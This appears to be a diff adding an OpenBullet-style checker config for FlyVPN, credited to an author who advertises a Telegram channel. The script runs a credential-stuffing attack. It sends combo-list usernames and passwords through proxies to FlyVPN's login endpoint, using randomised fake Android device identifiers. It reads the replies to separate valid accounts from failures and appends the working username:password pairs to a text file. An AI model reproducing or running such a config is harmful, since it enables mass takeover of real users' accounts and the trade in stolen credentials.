@@ -1,0 +1,68 @@
+[SETTINGS]
+{
+  "Name": "FlyVPN",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-17T04:43:09.1125673-08:00",
+  "AdditionalInfo": "Telegram Channel : T.me/ghoulblack",
+  "RequiredPlugins": [],
+  "Author": "👑LilTOBA👑",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "Credentials",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#EncodeUSER FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#EncodePASS FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+#did FUNCTION RandomString "?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h-?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d-?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d" -> VAR "did" 
+
+#asid FUNCTION RandomString "?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "asid" 
+
+#uid FUNCTION RandomString "?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "uid" 
+
+#Length FUNCTION Length "_inst_mkt=com.microvirt.download&_lang=en&_m=android&_os_dev=Google%20G011A&_os_did=<did>&_os_dim=asid%3d<asid>&_os_hw=qcom&_os_lang=en-US&_os_ver=7.1.2&_site=fly&_tz=800&_uid=<uid>&_v=5.1.6.1&_vrf=ojk9b&cmd=ClientApiLogin%2fLogin&password=<PS>&username=<US>&" -> VAR "Length" 
+
+#Login REQUEST POST "https://login.flyvpn.com:4443/client.php" 
+  CONTENT "_inst_mkt=com.microvirt.download&_lang=en&_m=android&_os_dev=Google%20G011A&_os_did=<did>&_os_dim=asid%3d<asid>&_os_hw=qcom&_os_lang=en-US&_os_ver=7.1.2&_site=fly&_tz=800&_uid=<uid>&_v=5.1.6.1&_vrf=ojk9b&cmd=ClientApiLogin%2fLogin&password=<PS>&username=<US>&" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: login.flyvpn.com:4443" 
+  HEADER "Accept: */*" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: <Length>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "AuthResult\":\"WrongPassword\"" 
+    KEY "\",\"AuthMessage\":\"Invalid username or password.\"}}" 
+    KEY "Invalid username or password" 
+  KEYCHAIN Success OR 
+    KEY "InvitationBanner" 
+
+UTILITY File "FlyVpn.txt" AppendLines "<USER>: <PASS> //\\n =============================" 
+
